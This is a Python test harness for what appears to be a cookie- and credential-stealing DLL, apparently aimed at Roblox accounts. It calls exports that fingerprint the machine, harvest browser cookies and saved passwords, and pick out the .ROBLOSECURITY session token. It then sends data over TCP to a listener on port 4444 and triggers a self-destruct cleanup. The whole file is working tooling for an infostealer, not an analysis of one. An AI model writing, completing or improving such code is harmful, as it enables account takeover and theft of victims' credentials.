#!/usr/bin/env python3
"""
test_harness.py — Loads module.dll directly and tests exports.
No executor needed. Just run: python test_harness.py
"""

import ctypes
import os
import json

DLL_PATH = r"C:\Users\fares\Desktop\CookieCutter\module.dll"

def main():
    print("=" * 60)
    print("  Module DLL Test Harness")
    print("=" * 60)

    dll = ctypes.WinDLL(DLL_PATH)
    print(f"\n[+] DLL loaded: {DLL_PATH}")

    # ── GetFingerprint ────────────────────────────────────────
    print("\n─── GetFingerprint ───")
    dll.GetFingerprint.restype = ctypes.c_bool
    dll.GetFingerprint.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t)]

    buf = ctypes.create_string_buffer(4096)
    size = ctypes.c_size_t(4096)
    ok = dll.GetFingerprint(buf, ctypes.byref(size))
    if ok:
        fp = buf.value.decode('utf-8', errors='replace')
        print(f"  [+] OK\n{fp}")
    else:
        print("  [-] FAILED")

    # ── HarvestCookies ────────────────────────────────────────
    print("\n─── HarvestCookies ───")
    dll.HarvestCookies.restype = ctypes.c_bool
    dll.HarvestCookies.argtypes = [ctypes.c_wchar_p]

    out = r"C:\Users\fares\Desktop\CookieCutter\test_cookies.json"
    ok = dll.HarvestCookies(out)
    if ok and os.path.exists(out):
        with open(out, 'r', encoding='utf-8') as f:
            data = json.load(f)
        cookies = data.get('cookies', [])
        print(f"  [+] {len(cookies)} cookies → {out}")
        for c in cookies[:3]:
            v = c.get('value', '')
            print(f"      {c.get('host','?')} | {c.get('name','?')} = {v[:50]}{'...' if len(v)>50 else ''}")
        for c in cookies:
            if 'ROBLOSECURITY' in c.get('name', ''):
                print(f"\n  [!!!] .ROBLOSECURITY: {c['value'][:80]}...")
    else:
        print(f"  [-] None (ok={ok}, exists={os.path.exists(out)})")

    # ── HarvestCredentials ────────────────────────────────────
    print("\n─── HarvestCredentials ───")
    dll.HarvestCredentials.restype = ctypes.c_bool
    dll.HarvestCredentials.argtypes = [ctypes.c_wchar_p]

    out2 = r"C:\Users\fares\Desktop\CookieCutter\test_creds.json"
    ok = dll.HarvestCredentials(out2)
    if ok and os.path.exists(out2):
        with open(out2, 'r', encoding='utf-8') as f:
            data = json.load(f)
        creds = data.get('credentials', [])
        print(f"  [+] {len(creds)} credentials → {out2}")
        for c in creds[:3]:
            print(f"      {c.get('url','?')} | {c.get('username','?')}")
    else:
        print(f"  [-] None (ok={ok}, exists={os.path.exists(out2)})")

    # ── HarvestRobloxCookie ───────────────────────────────────
    print("\n─── HarvestRobloxCookie ───")
    dll.HarvestRobloxCookie.restype = ctypes.c_bool
    dll.HarvestRobloxCookie.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t)]

    cookie_buf = ctypes.create_string_buffer(4096)
    cookie_sz = ctypes.c_size_t(4096)
    ok = dll.HarvestRobloxCookie(cookie_buf, ctypes.byref(cookie_sz))
    if ok:
        print(f"  [+] {cookie_buf.value.decode('utf-8', errors='replace')[:80]}...")
    else:
        print("  [-] Not found (not logged into Roblox in any browser)")

    # ── ExfilTCP (only if listener.py is running) ─────────────
    print("\n─── ExfilTCP ───")
    dll.ExfilTCP.restype = ctypes.c_bool
    dll.ExfilTCP.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p]

    payload = json.dumps({"test": True}).encode()
    ok = dll.ExfilTCP(b"127.0.0.1", 4444, payload)
    if ok:
        print("  [+] Sent to 127.0.0.1:4444 — check listener.py")
    else:
        print("  [-] Failed (no listener on 127.0.0.1:4444 — expected)")

    # ── SelfDestruct ──────────────────────────────────────────
    print("\n─── SelfDestruct ───")
    dll.SelfDestruct.restype = None
    dll.SelfDestruct()
    print("  [+] Cleanup called")

    print("\n" + "=" * 60)
    print("  Done. Check test_cookies.json and test_creds.json")
    print("=" * 60)

if __name__ == "__main__":
    main()
